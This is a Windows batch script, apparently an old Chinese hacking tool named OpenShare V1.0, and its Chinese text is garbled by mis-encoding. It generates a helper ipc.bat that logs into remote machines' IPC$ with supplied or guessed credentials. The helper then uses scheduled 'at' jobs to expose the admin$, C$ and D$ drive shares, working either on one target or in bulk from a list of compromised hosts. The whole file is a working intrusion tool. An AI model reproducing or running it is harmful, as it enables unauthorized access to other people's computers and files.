@echo off
color 3e 
cls

Rem ==========================������ipc.bat������====================================
echo @echo off  >ipc.bat
echo echo.    >>ipc.bat
echo echo ��������%%1...    >>ipc.bat
echo echo.    >>ipc.bat
echo net use \\%%1\ipc$ %%3 /user:%%2 ^& IF errorlevel 1 goto :Error    >>ipc.bat
echo echo ���ڲ�ѯ%%1�ĵ�ǰʱ��    >>ipc.bat
echo echo.    >>ipc.bat
echo net time \\%%1 /set /y ^& IF errorlevel 1 goto :Error    >>ipc.bat
echo for /f "tokens=1,2 delims=:"  %%%%i in ("%%time%%") do set /a hh=%%%%i ^& set /a mm=%%%%j    >>ipc.bat
echo echo %%1��ǰʱ��Ϊ%%hh%%:%%mm%%    >>ipc.bat
echo set /a mm=%%mm%%+1    >>ipc.bat
echo if /i %%mm%% geq 60 set /a mm=0 ^& set /a hh=%%hh%%+1    >>ipc.bat
echo if /i %%hh%% geq 24 set /a hh=0    >>ipc.bat
echo set tm=%%hh%%:%%mm%%    >>ipc.bat
echo echo.    >>ipc.bat
echo echo ���ô򿪹����ʱ��Ϊ%%tm%%    >>ipc.bat
echo echo.    >>ipc.bat
echo at \\%%1 %%tm%% net share admin$  ^& IF errorlevel 1 goto :Error    >>ipc.bat
echo echo.    >>ipc.bat
echo echo ����admin$����%%tm%%����    >>ipc.bat
echo echo.    >>ipc.bat
echo at \\%%1 %%tm%% net share c$=c:  ^& IF errorlevel 1 goto :Error    >>ipc.bat
echo echo.    >>ipc.bat
echo echo ����C$����%%tm%%����    >>ipc.bat
echo echo.    >>ipc.bat
echo at \\%%1 %%tm%% net share d$=d:  ^& IF errorlevel 1 goto :Error    >>ipc.bat
echo echo.    >>ipc.bat
echo echo ����D$����%%tm%%����    >>ipc.bat
echo echo.    >>ipc.bat
echo echo ����ٹ�60�룬���й���ͻᱻ�򿪣����Ժ�...    >>ipc.bat
echo goto :BYE    >>ipc.bat
echo :Error    >>ipc.bat
echo echo.    >>ipc.bat
echo net use \\%%1\ipc$ /del /y    >>ipc.bat
echo echo %%1���ִ�������ܳɹ���ɣ�    >>ipc.bat
echo echo.    >>ipc.bat
echo goto :exit    >>ipc.bat
echo :BYE    >>ipc.bat
echo echo.    >>ipc.bat
echo net use \\%%1\ipc$ /del /y    >>ipc.bat
echo echo %%1�ɹ������������    >>ipc.bat
echo echo.    >>ipc.bat
echo :exit    >>ipc.bat
echo echo ------------------------------------------------------    >>ipc.bat
echo exit   >>ipc.bat
Rem ======================================��======================================


if {%1}== {} goto :Usage
if {%2}== {} goto :file
if {%3}== {} goto :Usage
if not {%3}== {} goto :open

:File
echo ======================================================
echo                 ��Ѫ-OpenShare V1.0          
echo ======================================================
if not exist %1 echo ָ���ļ�������! & pause & goto  Usage
for /f "tokens=1-3 delims= "  %%i in (%1) do  start /b /wait ipc.bat %%i %%j %%k
goto exit

:Open
echo ======================================================
echo                 ��Ѫ-OpenShare V1.0       
echo ======================================================
start /b /wait ipc.bat %1 %2 %3
goto exit


:Usage
cls
echo ======================================================
echo                 ��Ѫ-OpenShare V1.0      
echo            Download by  С���    ChineseHack.org    
echo ======================================================
echo ��ȫ��������д��Զ�̿�������Ĺ��ߡ��������������ˡ�
echo ���ߣ���Ѫ
echo ��ҳ��http://txhak.myrice.com/
echo ���䣺txhak@etang.com
echo QQ:   22540685
echo txshare.bat [IP] [�û���] [����]
echo txshare.bat [�⼦�ļ�]
echo ���ָ���⼦�ļ����������ļ��ж�ȡip �û��� ����
echo �⼦�ļ����ļ���ʽΪip �û��� ���롣�ո������
echo ��1��txshare 192.168.0.2 user "" 
echo ��2��txshare file.txt
echo �⼦�ļ���ʽ���£��ո��������
echo 192.168.0.1 user ""
echo 192.168.0.2 administrator 123
echo 192.168.0.24 administrator admin
echo ------------------------------------------------------

:exit